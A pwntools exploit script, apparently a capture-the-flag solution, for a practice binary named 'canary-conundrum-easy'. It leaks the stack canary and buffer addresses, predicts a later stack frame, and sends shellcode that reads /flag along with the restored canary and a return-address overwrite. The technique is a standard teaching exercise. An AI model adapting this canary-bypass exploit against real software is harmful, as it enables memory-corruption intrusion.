#!/usr/bin/env python3
import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

def exploit():
    p = process("/challenge/canary-conundrum-easy")

    # === Phase 1 ===
    p.sendlineafter(b"Payload size:", b"6")
    p.sendafter(b"!\n", b"REPEAT")

    out1 = p.recvuntil(b"You said:").decode()
    buf1 = int(re.search(r"buffer starts at (0x[0-9a-f]+)", out1).group(1), 16)
    canary = int(re.search(r"canary value is now (0x[0-9a-f]+)", out1).group(1), 16)

    log.info(f"[*] 全局 Canary: {hex(canary)}")
    log.info(f"[*] 第一层栈基址 (Buf1): {hex(buf1)}")

    # === Phase 2: 计算偏移 ===
    p.sendlineafter(b"Payload size:", b"6")
    p.sendafter(b"!\n", b"REPEAT")

    out2 = p.recvuntil(b"You said:").decode()
    buf2 = int(re.search(r"buffer starts at (0x[0-9a-f]+)", out2).group(1), 16)

    # 栈是向下生长的，计算栈帧大小
    frame_size = buf1 - buf2
    log.info(f"[*] 栈帧偏移 (Frame Size): {hex(frame_size)}")

    # 预测第三次递归
    buf3 = buf2 - frame_size
    log.info(f"[*] 第三层栈基址 (Buf3): {hex(buf3)}")

    # === Phase 3: Payload ===
    shellcode = asm(shellcraft.cat("/flag"))

    # 152 bytes (buf to ret) + 8 bytes (RIP overwrite)
    payload_len = 160
    p.sendlineafter(b"Payload size:", str(payload_len).encode())

    payload = shellcode
    payload = payload.ljust(136, b"\x90")  # 填充至 Canary
    payload += p64(canary)                 # 注入正确的 Canary (绕过检测)
    payload += b"B" * 8                    # 填充 Dummy RBP
    payload += p64(buf3)                   # 覆盖返回地址到 Shellcode

    p.sendafter(b"!\n", payload)
    p.interactive()

if __name__ == "__main__":
    exploit()

